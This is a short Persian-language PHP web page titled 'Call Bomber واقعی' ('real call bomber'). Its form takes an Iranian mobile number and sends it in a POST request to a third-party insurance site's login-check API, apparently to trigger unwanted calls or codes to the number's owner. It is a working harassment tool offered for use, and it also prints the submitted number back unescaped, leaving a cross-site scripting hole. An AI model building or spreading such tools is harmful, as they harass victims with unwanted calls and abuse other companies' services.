
<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>Call Bomber واقعی</title>
  <style>
    body { font-family: sans-serif; background: #111; color: white; text-align: center; padding: 40px; }
    form { background: #222; padding: 20px; margin: auto; width: 300px; border-radius: 10px; box-shadow: 0 0 10px #0f0; }
    input, button { padding: 10px; margin: 10px 0; width: 90%; }
  </style>
</head>
<body>
  <h2>ارسال تماس واقعی به شماره</h2>
  <form method="POST">
    <input type="text" name="phone" placeholder="09xxxxxxxxx" required pattern="^09\d{9}$">
    <button type="submit">ارسال تماس</button>
  </form>
  <?php
  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $phone = $_POST['phone'];
    echo "<p>در حال ارسال تماس به شماره: <strong>$phone</strong></p>";
    $data = json_encode(["cellphone" => $phone]);
    $ch = curl_init("https://bimebazar.com/api/v1/auth/check-login");
    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_POST => true, CURLOPT_POSTFIELDS => $data, CURLOPT_HTTPHEADER => ["Content-Type: application/json"]]);
    curl_exec($ch); curl_close($ch);
  }
  ?>
</body>
</html>
